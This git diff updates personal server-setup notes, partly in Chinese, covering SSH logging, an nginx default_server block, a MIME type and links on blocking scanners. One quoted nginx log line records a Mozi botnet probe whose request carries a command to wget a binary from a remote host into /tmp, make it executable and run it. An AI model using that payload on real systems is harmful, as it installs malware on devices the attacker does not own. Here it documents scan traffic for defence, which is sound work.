@@ -98,6 +98,14 @@ PermitEmptyPasswords no
 
 # 禁止 root 账户通过 SSH 登入
 PermitRootLogin no
+
+# Logging
+SyslogFacility AUTH
+LogLevel INFO
+```
+
+```bash
+journalctl -u sshd |tail -100
 ```
 
 ## application
@@ -179,7 +187,31 @@ systemctl restart nginx.service
 
 <https://www.digitalocean.com/community/tools/nginx>
 
+`nginx.conf`
+
+```nginx
+# nginx 的 default_server 指令可以定义默认的 server 去处理一些没有匹配到 server_name 的请求，如果没有显式定义，则会选取第一个定义的 server 作为 default_server
+listen 80 default_server;
+server_name _; # _ 并不是重点 __ 也可以 ___也可以
+```
+
+`mime.types`
+
+```nginx
+text/markdown md markdown;
+```
+
 > log
+
+<https://segmentfault.com/a/1190000019382893>
+
+> secure
+
+<https://blog.naibabiji.com/skill/nginx-fang-sao-miao.html>
+
+```
+[info] 26014#0: *46 client sent invalid method while reading client request line, client: x.x.x.x, server: _, request: "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0"
+```
 
 ### SSL
 
@@ -254,6 +286,16 @@ TODO: `ssl_stapling`
 curl ip.gs
 curl ip.0x64.ml
 ```
+
+### 浏览器相关
+
+书签同步
+
+阅读列表同步
+
+密码同步
+
+网站黑名单同步
 
 ## secure
 
